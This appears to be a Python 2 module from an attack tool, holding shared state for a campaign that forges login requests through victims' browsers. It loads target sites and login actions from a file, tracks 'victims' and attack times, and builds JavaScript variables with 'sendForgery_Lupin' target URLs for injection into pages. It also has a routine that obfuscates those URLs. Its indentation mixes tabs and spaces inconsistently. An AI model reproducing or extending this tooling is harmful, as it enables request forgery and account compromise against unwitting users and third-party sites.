import time

class PersistentData:    

    _instance = None

    def __init__(self):
        self.dnsCache        = {}
        self.loginAction     = self.mapLoginActions()
	self.slaveVariables  = ""        
	self.lastAttackTime  = {}
        self.victims         = []
	self.shutDown        = False
        self.sleepInterval   = -1
	self.limitRefresh    = -1

    def setSleepInterval(self, interval):
	self.sleepInterval = interval
	  
    def setLimitRefresh(self, limit):
	self.limitRefresh = limit      

    def addDnsCache(self, host, address):
        self.dnsCache[host] = address

    def mapLoginActions(self):
	try:
		targetSites = open("targetSites.txt")
	except:
		self.shutDown = True
		return -1

	actions = {}
	for filelineno, line in enumerate(targetSites):
	    cr = line.find("\r")
            if cr != -1:
                line = line[:cr]
	    nl = line.find("\n")
	    if nl != -1:
                line = line[:nl]
                
            host_action = line.split("|")
	    if len(host_action) != 2:
	       print "ERROR: targetSites.txt line "+str(filelineno)+": "+line
	    else:
	    	if host_action[0].startswith("http://"):
                	host_action[0] = host_action[0][7:]

		slash = host_action[0].find('/')
		if slash != -1:
			host_action[0] = host_action[0][:slash]
	    
            	actions[host_action[0]] = "'"+host_action[1]+"'"
	targetSites.close()
	return actions


    def setLastAttackTime(self, client):
	self.lastAttackTime[client] = time.time()

  
    def addVictim(self, client):
        self.victims.append(client)


    def oldVictim(self, client):
        if client in self.victims:
		return True
	return False


    def setSlaveVariables(self, refresh, sleep):
	self.slaveVariables = "var targets=["
	targetSites = open("targetSites.txt")

	for filelineno,line in enumerate(targetSites):
            cr = line.find("\r")
            if cr != -1:
                line = line[:cr]
	    nl = line.find("\n")
	    if nl != -1:
                line = line[:nl]
            host = line.split("|")[0]
            if host.startswith("http://"):
               host = host[7:]
              
            self.slaveVariables+="\"http://"+host+"?sendForgery_Lupin=1\"," 
            #self.slaveVariables+="\""+self.obfuscate("http://"+host+"?sendForgery_Lupin=1")+"\","
            
        self.slaveVariables = self.slaveVariables[:-1] + "];var limitRefresh = "+str(refresh)+";var sleepInterval = "+str(sleep)+";"

        targetSites.close() 
	

 
    def obfuscate(self,host):
        obfs = ""
        for letter in host:
            obfs+=str(ord(letter)+255)+"."
        return obfs[:-1]



    def getInstance():
        if PersistentData._instance == None:
            PersistentData._instance = PersistentData()

        return PersistentData._instance

    getInstance = staticmethod(getInstance)



